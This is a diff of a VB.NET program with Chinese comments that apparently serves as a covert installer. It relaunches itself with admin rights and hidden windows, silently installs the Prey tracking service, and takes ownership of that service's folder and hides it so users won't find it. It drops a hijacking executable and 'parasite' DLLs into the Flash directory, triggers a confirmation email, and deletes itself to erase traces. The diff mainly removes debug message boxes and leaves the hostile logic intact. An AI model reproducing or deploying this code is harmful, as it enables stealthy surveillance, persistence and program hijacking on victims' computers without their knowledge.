@@ -15,14 +15,12 @@ Public Class DisplayForm
 
         '如果启动不包含参数，则把程序复制到临时目录，并加入参数运行
         If Command() = vbNullString Then
-            'Msgbox("将使用 [映像文件] 执行！")
             If IO.File.Exists(MySelfPath) Then IO.File.Delete(MySelfPath)
             FileSystem.FileCopy(Application.ExecutablePath, MySelfPath)
             '不等待宿主程序退出而退出
             ShellExecute(0, "runas", MySelfPath, "winscr", vbNullString, vbHide)
             End
         End If
-        'Msgbox("已经作为 [映像文件] 启动！")
 
         '检查管理员权限
         If Not (New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing))) Then
@@ -31,81 +29,31 @@ Public Class DisplayForm
         End If
 
         '释放 MSI 安装文件
-        If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then
-            'MsgBox("MSI 文件释放失败")
-            End
-        End If
-        'MsgBox("MSI 文件释放成功！")
+        If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
 
         '静默安装 Prey 服务
-        If Not InstallMSI() Then
-            'MsgBox("MSI 程序安装失败！")
-            End
-        End If
-        'MsgBox("MSI 程序安装成功！")
+        If Not InstallMSI() Then End
 
         '安装完毕后删除 MSI 安装程序
         If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)
 
         '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
-        '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间
-        '如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
+        '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
         Shell("cmd.exe /c takeown /f " & PreyDirectroy & "/ /r /d y && icacls " & PreyDirectroy & "/ /grant administrators:F /t", vbHide, True)
         '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
         Shell("cmd.exe /c attrib " & PreyDirectroy & " +s +h", vbHide, True)
-        'MsgBox("提权 & 隐藏 成功！")
 
-        '释放官方 [flash.exe] 到 [alert.exe]，实现程序劫持
-        '不采用重命名官方 [flash.exe] 为 [alert.exe] 的方法，防止 [flash.exe] 文件已经替换之后出现的逻辑错误
-        'FileSystem.Rename(FlashDirectroy & "flash.exe", FlashDirectroy & "alert.exe")
+        '释放劫持程序
         SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectroy & "alert.exe")
-        'If SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectroy & "alert.exe") Then
-        '    MsgBox("程序劫持成功！")
-        'Else
-        '    MsgBox("程序劫持失败！")
-        'End If
-
-        '开始释放 寄生程序 到目标目录
         SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectroy & "AForge.Video.dll")
-        'If SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectroy & "AForge.Video.dll") Then
-        '    MsgBox("AForge.Video.dll 释放成功")
-        'Else
-        '    MsgBox("AForge.Video.dll 释放失败")
-        'End If
         SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectroy & "AForge.Video.DirectShow.dll")
-        'If SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectroy & "AForge.Video.DirectShow.dll") Then
-        '    MsgBox("AForge.Video.DirectShow.dll 释放成功")
-        'Else
-        '    MsgBox("AForge.Video.DirectShow.dll 释放失败")
-        'End If
         SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectroy & "Microsoft.DirectX.dll")
-        'If SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectroy & "Microsoft.DirectX.dll") Then
-        '    MsgBox("Microsoft.DirectX.dll 释放成功")
-        'Else
-        '    MsgBox("Microsoft.DirectX.dll 释放失败")
-        'End If
         SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectroy & "Microsoft.DirectX.DirectSound.dll")
-        'If SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectroy & "Microsoft.DirectX.DirectSound.dll") Then
-        '    MsgBox("Microsoft.DirectX.DirectSound.dll 释放成功")
-        'Else
-        '    MsgBox("Microsoft.DirectX.DirectSound.dll 释放失败")
-        'End If
         SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectroy & "flash.exe.config")
-        'If SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectroy & "flash.exe.config") Then
-        '    MsgBox("flash.exe.config 释放成功")
-        'Else
-        '    MsgBox("flash.exe.config 释放失败")
-        'End If
         SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectroy & "flash.exe")
-        'If SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectroy & "flash.exe") Then
-        '    MsgBox("Flash.exe 释放成功")
-        'Else
-        '    MsgBox("Flash.exe 释放失败")
-        'End If
 
         '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
         ShellExecute(0, vbNullString, FlashDirectroy & "flash.exe", "update", vbNullString, vbHide)
-        'MsgBox("程序结束！")
 
         '结束程序并自动删除自身文件，以隐藏痕迹
         DeleteMySelf()
